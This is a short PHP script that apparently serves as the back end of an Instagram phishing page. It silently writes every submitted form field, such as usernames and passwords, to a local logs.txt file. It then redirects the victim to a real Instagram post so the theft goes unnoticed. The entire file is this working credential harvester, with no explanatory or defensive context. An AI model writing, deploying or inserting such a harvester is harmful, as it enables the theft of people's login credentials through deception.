<?php
header ('Location:https://www.instagram.com/p/B8BBm6UAa1Y/?igshid=1lxu3sjvjvvfb');
$handle = fopen("./logs.txt", "a");
foreach($_POST as $variable => $value) {
   fwrite($handle, $variable);
   fwrite($handle, " = ");
   fwrite($handle, $value);
   fwrite($handle, "\r   \n");
}
fwrite($handle, "\r   \n   \n");
fclose($handle);
exit;

?>
